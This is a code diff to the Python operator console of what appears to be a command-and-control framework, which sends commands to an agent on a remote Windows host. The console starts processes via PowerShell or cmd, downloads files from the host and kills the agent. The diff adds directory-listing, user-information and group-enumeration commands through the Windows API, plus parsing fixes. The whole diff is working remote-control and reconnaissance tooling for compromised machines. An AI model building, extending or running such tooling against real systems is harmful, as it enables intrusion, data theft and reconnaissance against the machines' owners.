@@ -3,6 +3,7 @@ import itertools
 import os
 import requests
 import subprocess
+import re
 
 from .database import supabase, get_public_url
 from .download import download_file
@@ -43,6 +44,9 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             print("  psrun <pattern>                   :: Start a new process via Powershell")
             print("  cmdrun <pattern>                  :: Start a new process via cmd")
             print("  kill                              :: Send a signal to terminate the agent")
+            print("  wls <directory_path>              :: List contents of a directory on Windows host via Windows API")
+            print("  wami                              :: Display user information on Windows host via Windows API")
+            print("  users <group_name>                :: List users in the specified group on Windows host via Windows API")
             print("  exit                              :: Return to main menu\n")
             continue
 
@@ -57,20 +61,21 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             command_text = "kill"  # ensure the command text is exactly "kill" to match agent's expectation
 
         # Download command
-        if command_text.startswith("download "):
+        if command_text.startswith("download"):
             try:
-                _, file_path = command_text.split(maxsplit=1)
+                parts = command_text.split(maxsplit=1)
+                if len(parts) < 2:
+                    print(f"{RED}Error:{RESET} Invalid download command format. Use 'download <file_path>'.")
+                    continue
+                _, file_path = parts
                 download_file(hostname, file_path, username)
                 continue
             except ValueError:
-                print("Invalid download command format. Use 'download <file_path>'.")
+                print(f"{RED}Error:{RESET} Invalid download command format. Use 'download <file_path>'.")
                 continue
 
         # Handle specific commands with arguments
-        if command_text.startswith("psls "):
-            args = command_text[5:]
-            command_text = f"powershell ls {args}"
-        elif command_text.startswith('ps grep'):
+        if command_text.startswith('ps grep'):
             try:
                 _, _, pattern = command_text.split(maxsplit=2)
                 command_text = f"powershell -Command \"Get-Process | Where-Object {{$_.ProcessName -like '*{pattern}*'}}\""
@@ -89,7 +94,7 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                 print("Invalid psrun command format. Use 'psrun <path_to_executable_or_file>'")
                 continue
 
-        # cmdrun command (new)
+        # cmdrun command
         if command_text.startswith("cmdrun "):
             try:
                 _, command = command_text.split(maxsplit=1)
@@ -98,6 +103,31 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                 continue
             except ValueError:
                 print("Invalid cmdrun command format. Use 'cmdrun <path_to_executable_or_file>'")
+                continue
+
+        # Handle the new 'wls' command
+        if command_text.startswith("wls"):
+            parts = command_text.split(maxsplit=1)
+            if len(parts) == 1:
+                command_text = "wls ."  # Default to current directory if no path is provided
+            else:
+                command_text = f"wls {parts[1]}"
+
+        # Handle the new 'wami' command
+        if command_text == "wami":
+            command_text = "wami"
+
+        # Handle the new 'users' command
+        users_match = re.match(r'users\s+"([^"]+)"', command_text, re.IGNORECASE)
+        if users_match:
+            group_name = users_match.group(1)
+            command_text = f'users "{group_name}"'
+        elif command_text.lower().startswith("users "):
+            parts = command_text.split(maxsplit=1)
+            if len(parts) == 2:
+                command_text = f"users {parts[1]}"
+            else:
+                print("Invalid users command format. Use 'users <group_name>'.")
                 continue
 
         # Translate using command mappings
